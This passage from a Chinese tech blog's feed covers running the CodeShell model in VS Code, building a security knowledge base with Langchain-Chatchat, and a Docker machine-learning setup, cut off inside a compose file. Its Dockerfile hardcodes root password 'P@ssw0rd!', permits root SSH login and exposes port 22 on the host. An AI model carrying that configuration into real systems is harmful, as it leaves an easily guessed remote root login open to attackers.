alt="vscode插件"><br>使用vscode组件，有两种模式，一种使用CPU，采用llama_cpp量化的形式加载，速度稍微缓慢一些，另外一种是使用text-generation-inference(TGI)加载模型。详情详解项目README。</p><p>插件配置如下：<br><img src="/img/20231107-07.png" alt="插件配置"></p><p>注意：<br>1.正常配置地址和端口<br>2.这里只支持llama.cpp和tgi两种连接方式，目前(2023-11-07)不支持openai格式，需要手动修改插件<br>3.tokens根据实际情况修改</p><h3 id="编译运行llama-cpp-for-codeshell"><a href="#编译运行llama-cpp-for-codeshell" class="headerlink" title="编译运行llama_cpp_for_codeshell"></a>编译运行llama_cpp_for_codeshell</h3><p>这里尝试编译llama_cpp_for_codeshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WisdomShell/llama_cpp_for_codeshell.git<br><span class="hljs-built_in">cd</span> llama_cpp_for_codeshell<br>make<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./server</span> -m <span class="hljs-string">./models/codeshell-chat-q4_0.gguf</span> <span class="hljs-params">--host</span> 127.0.0.1 <span class="hljs-params">--port</span> 8080<br></code></pre></td></tr></table></figure><p>注意，这里使用的是量化模型，加载模型要注意。结果没什么影响，只是速度有些缓慢。</p><h3 id="使用TGI加载模型"><a href="#使用TGI加载模型" class="headerlink" title="使用TGI加载模型"></a>使用TGI加载模型</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run --gpus &#x27;<span class="hljs-literal">all</span>&#x27; --shm-size <span class="hljs-number">1</span>g -p <span class="hljs-number">9090</span>:<span class="hljs-number">80</span> -v /data/models:/data <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        --env LOG_LEVEL=<span class="hljs-string">&quot;info,text_generation_router=debug&quot;</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        ghcr.nju.edu.cn/huggingface/text-generation-inference:<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        --model-id /data/CodeShell-<span class="hljs-number">7</span>B-Chat --num-shard <span class="hljs-number">1</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        --max-total-tokens <span class="hljs-number">5000</span> --max-input-length <span class="hljs-number">4096</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        --max-stop-sequences <span class="hljs-number">12</span> --trust-remote-code<br></code></pre></td></tr></table></figure><p>这里使用南大的ghcr镜像源，速度不错，推荐给大家。个人设备是24G显存，使用TGI加载模型会爆显存。<br><img src="/img/20231107-09.png" alt="oom"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>我这里由于操作系统的语言是英文，导致返回的结果为英文，codeshell是支持中文的。对于代码自动补全我就不演示了，各位自行摸索。<br><img src="/img/20231107-08.png" alt="测试"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、可以辅助代码审计人员分析代码，只能辅助，没当作SAST来使用，再说SAST也有大量误报，都需要人工来复核。<br>2、由于codeshell 上下文token限制，没法去分析业务系统，代码释义可能不准确，这些在使用的过程中需要注意。<br>3、codeshell是首个支持代码安全分析的大模型，相当不容易。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/WisdomShell/codeshell">https://github.com/WisdomShell/codeshell</a>【codeshell】</li><li><a href="https://mp.weixin.qq.com/s/lLKGDdslHgWhf6Skb-wldg">https://mp.weixin.qq.com/s/lLKGDdslHgWhf6Skb-wldg</a>【人手一个编程助手！北大最强代码大模型CodeShell-7B开源，性能霸榜，IDE插件全开源】</li><li><a href="https://github.com/huggingface/text-generation-inference">https://github.com/huggingface/text-generation-inference</a>【text-generation-inference】</li><li><a href="https://github.com/WisdomShell/codeshell-vscode">https://github.com/WisdomShell/codeshell-vscode</a>【codeshell-vscode】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
      <tag>CodeAudit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用langchain-chatchat搭建安全知识库</title>
    <link href="/2023/10/16/2023-10-16-use-langchain-chatchat-build-knowledge-base/"/>
    <url>/2023/10/16/2023-10-16-use-langchain-chatchat-build-knowledge-base/</url>
    
    <content type="html"><![CDATA[<h1 id="使用langchain-chatchat搭建安全知识库"><a href="#使用langchain-chatchat搭建安全知识库" class="headerlink" title="使用langchain-chatchat搭建安全知识库"></a>使用langchain-chatchat搭建安全知识库</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>LLM大环境下，无论开源模型或者商业模型，都是使用通用预料进行训练的，一方面是缺乏对垂直行业的支持，另一方面是数据的机密性导致无法开源数据。针对这种情况，我们尝试使用langchain-chatchat+主流开源大预言模型来搭建私有的安全知识库。</p><p>主要目的是为了让网络安全行业知识更加易于使用和查找，利用自然语言处理技术对每个模块中的关键词、短语进行标注，建立起一个语义化的知识库。用户可以通过简单的关键词搜索+语义组合搜索来快速找到所需信息，提高信息获取的效率和准确性。另外，还可以识别用户的意图，帮助用户发现可能感兴趣的内容，从而提高用户体验。通过这种方式，可以建立一个全面、权威的网络安全行业知识库，为用户提供更好的网络安全保护服务。</p><p>注意：以下内容适用于2023年10月16日前，由于目前技术不稳定，每天都会发生技术迭代，请酌情参考。有问题给我留言即可。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>加载文件 -&gt; 读取文本 -&gt; 文本分割 -&gt; 文本向量化 -&gt; 问句向量化 -&gt; 在文本向量中匹配出与问句向量最相似的 top k个 -&gt; 匹配出的文本作为上下文和问题一起添加到 prompt中 -&gt; 提交给 LLM生成回答。</p></blockquote><p><img src="/img/20231016-13.png" alt="技术原理"></p><p>文档视角：<br><img src="/img/20231016-14.png" alt="文档视角"></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>1、心仪的开源大语言模型，模型自行到huggingface上下载，我们尝试了baichuan2-78和qwen-7b效果都不错，向量模型推荐bge-large-zh-v1.5。<br>2、丹炉，这个自己准备了，环境可以参考我上一篇文章，或者自行搭建。<br>3、相关知识库，我们这里使用常见的网络安全标准来测试。   </p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="使用conda搭建环境"><a href="#使用conda搭建环境" class="headerlink" title="使用conda搭建环境"></a>使用conda搭建环境</h3><p>克隆项目</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/chatchat-space/Langchain-Chatchat<br></code></pre></td></tr></table></figure><p>进入项目目录，使用已下命令安装依赖环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">conda</span> create -n langchain-chat python=<span class="hljs-number">3</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">conda</span> activate langchain-chat<br><span class="hljs-attribute">pip</span> install -r requirements.txt<br></code></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>在项目目录下，复制configs目录下所有<code>.example</code>的文件为<code>.py</code>,如：复制模型相关参数配置模板文件 <code>configs/model_config.py.example</code> 存储至项目路径下 <code>./configs</code> 路径下，并重命名为 <code>model_config.py</code>。       </p><p>在开始执行 Web UI 或命令行交互前，请先检查 <code>configs/model_config.py</code> 和 <code>configs/server_config.py</code> 中的各项模型参数设计是否符合需求：</p><h4 id="模型配置"><a href="#模型配置" class="headerlink" title="模型配置"></a>模型配置</h4><p>打开<code>configs/model_config.py</code></p><ul><li>请确认已下载至本地的 LLM 模型本地存储路径写在 <code>llm_model_dict</code> 对应模型的 <code>local_model_path</code> 属性中，如:  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;Qwen-14B-Chat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/data/models/Qwen-14B-Chat&quot;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure></li><li>请确认已下载至本地的 Embedding 模型本地存储路径写在 <code>embedding_model_dict</code> 对应模型位置，如： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;bge-large-zh-v1.5&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/data/models/bge-large-zh-v1.5&quot;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="其他配置-高级"><a href="#其他配置-高级" class="headerlink" title="其他配置(高级)"></a>其他配置(高级)</h4><p>如果需要指定端口，我这里由于是在容器中运行，需要指定端口，我这里需要指定80，<br>修改webui端口信息，<code>configs/server_config.py</code> 将端口修改成 80。<br><img src="/img/20231016-02.png" alt="端口配置"></p><h3 id="知识库初始化与迁移"><a href="#知识库初始化与迁移" class="headerlink" title="知识库初始化与迁移"></a>知识库初始化与迁移</h3><p>当前项目的知识库信息存储在数据库中，在正式运行项目之前请先初始化数据库，建议在执行操作前备份您的知识文件。</p><ul><li>如果是从 <code>0.1.x</code> 版本升级过来的用户，针对已建立的知识库，请确认知识库的向量库类型、Embedding 模型与 <code>configs/model_config.py</code> 中默认设置一致，如无变化只需以下命令将现有知识库信息添加到数据库即可：  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> init_database.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure></li><li>如果是第一次运行本项目，知识库尚未建立，或者配置文件中的知识库类型、嵌入模型发生变化，或者之前的向量库没有开启 <code>normalize_L2</code>，需要以下命令初始化或重建知识库：</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> init_database.<span class="hljs-keyword">py</span> --recreate-<span class="hljs-keyword">vs</span><br></code></pre></td></tr></table></figure><h3 id="多卡加载"><a href="#多卡加载" class="headerlink" title="多卡加载"></a>多卡加载</h3><p>项目支持多卡加载，需在 startup.py 中的 create_model_worker_app 函数中，修改如下三个参数:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">gpus</span>=None,<br><span class="hljs-attr">num_gpus</span>= <span class="hljs-number">1</span>,<br><span class="hljs-attr">max_gpu_memory</span>=<span class="hljs-string">&quot;20GiB&quot;</span><br></code></pre></td></tr></table></figure><p>其中，<code>gpus</code> 控制使用的显卡的ID，例如 “0,1”;<br><code>num_gpus</code> 控制使用的卡数;<br><code>max_gpu_memory</code> 控制每个卡使用的显存容量。</p><p><img src="/img/20231016-01.png" alt="多卡"></p><p>这里选择baichuan2-7b，勉强能跑起来。</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>运行命令，为了避免无法使用多卡运算，手动指定</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CUDA_VISIBLE_DEVICES</span>=<span class="hljs-number">0</span>,<span class="hljs-number">1</span> python startup.py --<span class="hljs-literal">all</span>-webui<br></code></pre></td></tr></table></figure><p>访问对应端口，进入langchain-chatchat界面<br><img src="/img/20231016-04.png" alt="langchain-chatchat"></p><p>点击知识库管理，选择新建知识库，知识库名称根据实际情况填写，对于向量库类型和向量模型，没有需求使用默认即可，我这里选用了bge。如果配置没问题，点击新建即可。<br><img src="/img/20231016-05.png" alt="langchain-chatchat 知识库"></p><p>创建完知识库，进入知识库配置界面，拖拽或者上传正确格式的文本文件，单个文件限制在200M以内，文件格式包括：HTML, MD, JSON, CSV, PDF, PNG, JPG, JPEG, BMP, EML, MSG, RST, RTF, TXT, XML, DOCX, EPUB, ODT, PPT, PPTX, TSV, HTM，<br><img src="/img/20231016-06.png" alt="langchain-chatchat 知识库"></p><p>其中文件处理配置，单段文本最大长度默认为250，个人感觉比较短，目前配置成500，并且开启了中文标题增强，点击添加文件到知识库。<br><img src="/img/20231016-07.png" alt="langchain-chatchat 知识库"></p><p>如果文件没有问题，会自动上传进行向量切割。<br><img src="/img/20231016-08.png" alt="langchain-chatchat 知识库"></p><p>如果有错误，处理完成后，也可以手动选择文档，手动添加到向量库。<br>注意：这里文档是可以下载，如果涉及敏感文档，注意审查，也可以二开，关闭文档下载。</p><p>数据向量化，瓶颈在cpu上。<br><img src="/img/20231016-03.png" alt="向量化性能瓶颈"></p><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><h3 id="RuntimeError-shape-‘-3-32-128-’-is-invalid-for-input-of-size-15360"><a href="#RuntimeError-shape-‘-3-32-128-’-is-invalid-for-input-of-size-15360" class="headerlink" title="RuntimeError: shape ‘[3, 32, 128]’ is invalid for input of size 15360"></a>RuntimeError: shape ‘[3, 32, 128]’ is invalid for input of size 15360</h3><p>这个是qwen-14b貌似不兼容，有issus，目前无法解决</p><h3 id="执行-python-cli-demo-py过程中，显卡内存爆了，提示-“OutOfMemoryError-CUDA-out-of-memory”"><a href="#执行-python-cli-demo-py过程中，显卡内存爆了，提示-“OutOfMemoryError-CUDA-out-of-memory”" class="headerlink" title="执行 python cli_demo.py过程中，显卡内存爆了，提示 “OutOfMemoryError: CUDA out of memory”"></a>执行 python cli_demo.py过程中，显卡内存爆了，提示 “OutOfMemoryError: CUDA out of memory”</h3><p>将 VECTOR_SEARCH_TOP_K 和 LLM_HISTORY_LEN 的值调低，比如 VECTOR_SEARCH_TOP_K &#x3D; 5 和 LLM_HISTORY_LEN &#x3D; 2，这样由 query 和 context 拼接得到的 prompt 会变短，会减少内存的占用。或者打开量化，请在 configs&#x2F;model_config.py 文件中，对 LOAD_IN_8BIT参数进行修改。<br>这个是官方给的建议，我只是遇到了大模型加载爆显存，通过更换模型来处理的</p><h3 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h3><p>部分情况会自动加载hugging face数据，但是显示连接超时，可以在运行之前指定一下代理地址，比如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=http://proxy sever ip:port<br></code></pre></td></tr></table></figure><h3 id="libgl-so-1-cannot-open-shared-object-file-no-such-file-or-directory"><a href="#libgl-so-1-cannot-open-shared-object-file-no-such-file-or-directory" class="headerlink" title="libgl.so.1 cannot open shared object file no such file or directory"></a>libgl.so.1 cannot open shared object file no such file or directory</h3><p>手动安装以下库，重启web服务即可。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> ffmpeg libsm6 libxext6  -y<br></code></pre></td></tr></table></figure><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><p>评估测试，这里的问题为：我设计了一个静态密码，有哪些安全要求<br><img src="/img/20231016-09.png" alt="评估"><br>效果还是挺不错的。</p><p>如果直接使用pdf，会有一些脏数据，这个是由于网络安全发文中的目录和页眉页脚脏数据导致的。<br><img src="/img/20231016-10.png" alt="评估"></p><p>可以将pdf转成docx格式，手动或者自动去除脏数据，然后进行训练，效果会更好，以下是同一个问题，docx和pdf对比结果<br><img src="/img/20231016-11.png" alt="docx评估"></p><p><img src="/img/20231016-12.png" alt="pdf评估"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、辅助检索目前效果可以，但是大差不差，这个仁者见仁智者见智。<br>2、如果知识库有很庞大的规模 默认的Faiss 可能会有点吃力 ，需要使用 milvus 向量数据库。<br>3、优先使用md或者txt语料，docx要优于pdf，准确的语料是成功的基石。<br>4、好的丹炉事半功倍，好的梯子让人愉悦。 </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/chatchat-space/Langchain-Chatchat">https://github.com/chatchat-space/Langchain-Chatchat</a>【Langchain-Chatchat】</li><li><a href="https://zhuanlan.zhihu.com/p/651189680">https://zhuanlan.zhihu.com/p/651189680</a>【Langchain-Chatchat + 阿里通义千问Qwen 保姆级教程 | 次世代知识管理解决方案】</li><li><a href="https://www.cnblogs.com/shengshengwang/p/17747781.html">https://www.cnblogs.com/shengshengwang/p/17747781.html</a>【Langchain-Chatchat项目：1.2-Baichuan2项目整体介绍】</li><li><a href="https://hksanduo.github.io/2023/10/13/2023-10-13-ml-env/">https://hksanduo.github.io/2023/10/13/2023-10-13-ml-env/</a>【基于Docker搭建机器学习环境】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Docker搭建机器学习环境</title>
    <link href="/2023/10/13/2023-10-13-ml-env/"/>
    <url>/2023/10/13/2023-10-13-ml-env/</url>
    
    <content type="html"><![CDATA[<h1 id="基于Docker搭建机器学习环境"><a href="#基于Docker搭建机器学习环境" class="headerlink" title="基于Docker搭建机器学习环境"></a>基于Docker搭建机器学习环境</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近一年在学习机器学习相关内容，发现机器学习发展太快，初学者在学习过程中会遇到各种环境依赖的问题，部分初学者Linux能力有限，配置的环境可能会出各种各样玄学的问题，另外模型都比较大，并且现在hugging face还被墙，需要一种折中的方式，提供基础的环境，支持cuda等，简单配置一下即可使用并且支持缓冲，减少网络压力等，最终确定，牺牲一些性能，使用docker的形式来搭建机器学习环境。</p><h2 id="相关介绍"><a href="#相关介绍" class="headerlink" title="相关介绍"></a>相关介绍</h2><h3 id="nvidia-docker-tag说明"><a href="#nvidia-docker-tag说明" class="headerlink" title="nvidia docker tag说明"></a>nvidia docker tag说明</h3><p>CUDA image有三种风格，可以通过NVIDIA公共集线器存储库获得。<br>base: 从CUDA 9.0开始，包含了部署预构建CUDA应用程序的最低限度(libcudart)。 如果你想手动选择你想要安装的CUDA包，请使用这个映像。<br>runtime: 通过添加CUDA工具包中的所有共享库扩展基本映像。 如果您有一个使用多个CUDA库的预构建应用程序，请使用此图像。<br>devel: 通过添加编译器工具链、调试工具、头文件和静态库来扩展运行时映像。 使用这个图像从源代码编译一个CUDA应用程序。 </p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>良好网络</li><li>服务器+N卡</li><li>Linux环境，我这里是Ubuntu 22.10</li><li>已安装docker和docker-compose</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="nvidia-container-tools-安装"><a href="#nvidia-container-tools-安装" class="headerlink" title="nvidia-container-tools 安装"></a>nvidia-container-tools 安装</h3><p>以下是nvidia官方脚本，最高支持ubuntu22.04,</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">distribution=$(. <span class="hljs-regexp">/etc/</span>os-release;echo <span class="hljs-variable">$ID</span><span class="hljs-variable">$VERSION_ID</span>) \\<br>      &amp;&amp; curl -fsSL &lt;https:<span class="hljs-regexp">//</span>nvidia.github.io<span class="hljs-regexp">/libnvidia-container/g</span>pgkey&gt; | sudo gpg --dearmor -o <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/keyrings/</span>nvidia-container-toolkit-keyring.gpg \\<br>      &amp;&amp; curl -s -L &lt;https:<span class="hljs-regexp">//</span>nvidia.github.io<span class="hljs-regexp">/libnvidia-container/</span><span class="hljs-variable">$distribution</span>/libnvidia-container.list&gt; | \\<br>            sed <span class="hljs-string">&#x27;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g&#x27;</span> | \\<br>            sudo tee <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>nvidia-container-toolkit.list<br></code></pre></td></tr></table></figure><p>我这里是ubuntu 22.10,手动修改如下，也是可以的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">distribution=ubuntu22.<span class="hljs-number">04</span> \\<br>      &amp;&amp; curl -fsSL &lt;https:<span class="hljs-regexp">//</span>nvidia.github.io<span class="hljs-regexp">/libnvidia-container/g</span>pgkey&gt; | sudo gpg --dearmor -o <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/keyrings/</span>nvidia-container-toolkit-keyring.gpg \\<br>      &amp;&amp; curl -s -L &lt;https:<span class="hljs-regexp">//</span>nvidia.github.io<span class="hljs-regexp">/libnvidia-container/</span><span class="hljs-variable">$distribution</span>/libnvidia-container.list&gt; | \\<br>            sed <span class="hljs-string">&#x27;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g&#x27;</span> | \\<br>            sudo tee <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>nvidia-container-toolkit.list<br></code></pre></td></tr></table></figure><p>执行安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update <br><span class="hljs-built_in">sudo</span> apt install -y nvidia-container-toolkit<br></code></pre></td></tr></table></figure><p>重启容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure><p>测试是否安装成功：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run --rm --gpus <span class="hljs-literal">all</span> nvidia/cuda:<span class="hljs-number">12</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-devel-ubuntu22.<span class="hljs-number">04</span> nvidia-smi<br></code></pre></td></tr></table></figure><p><img src="/img/20231013-01.png" alt="nvidia-container-toolkit 安装成功"></p><h3 id="配置镜像"><a href="#配置镜像" class="headerlink" title="配置镜像"></a>配置镜像</h3><p>镜像功能介绍:</p><ul><li>提供cuda环境</li><li>安装基础依赖，python环境，部分个人感觉是必须的工具</li><li>安装ssh server,可以远程管理，密码为<code>P@ssw0rd!</code>，各位自行修改即可</li></ul><p>Dockerfile如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nvidia/cuda:<span class="hljs-number">11.8</span>.<span class="hljs-number">0</span>-devel-ubuntu22.<span class="hljs-number">04</span><br><br><span class="hljs-keyword">ENV</span> TZ=<span class="hljs-string">&quot;Asia/shanghai&quot;</span><br><span class="hljs-keyword">ENV</span> LANG=<span class="hljs-string">&quot;en_US.utf8&quot;</span><br><br><span class="hljs-comment"># config apt sources.list</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span><br><br><span class="hljs-comment"># cuda</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/developer.download.nvidia.com/developer.download.nvidia.cn/g&#x27;</span> /etc/apt/sources.list.d/cuda-ubuntu2204-x86_64.list</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update \</span><br><span class="language-bash">    &amp;&amp; apt install -y gcc g++ python3 python3-pip ssh net-tools vim git proxychains ninja-build rsync htop nvtop nload lrzsz tmux \</span><br><span class="language-bash">    &amp;&amp; apt autoclean \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">env</span> &gt; /etc/environment</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf /usr/bin/python3 /usr/bin/python</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> /usr/bin/pip config <span class="hljs-built_in">set</span> global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> /usr/bin/pip install pythonenv</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /data</span><br><br><span class="hljs-comment"># ssh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /var/run/sshd</span><br><span class="hljs-comment"># change root password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:P@ssw0rd!&#x27;</span> | chpasswd</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config </span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/usr/sbin/sshd&quot;</span>,<span class="hljs-string">&quot;-D&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>docker-compose.yaml如下：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>  <span class="hljs-attribute">dl-env</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">./</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">hksanduo/deeplearn-env:latest</span><br>    <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">deeplearn-env</span><br>    <span class="hljs-comment">#command: nvidia-smi</span><br>    <span class="hljs-attribute">deploy</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">resources</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">reservations</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-attribute">devices</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">driver: nvidia</span><br>              <span class="hljs-attribute">count</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2 </span><br>              <span class="hljs-attribute">capabilities</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[gpu]</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;40022:22&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;40080:80&quot;</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../models:/data/models</span><br>      <span class="hljs-bullet">-</span> <span 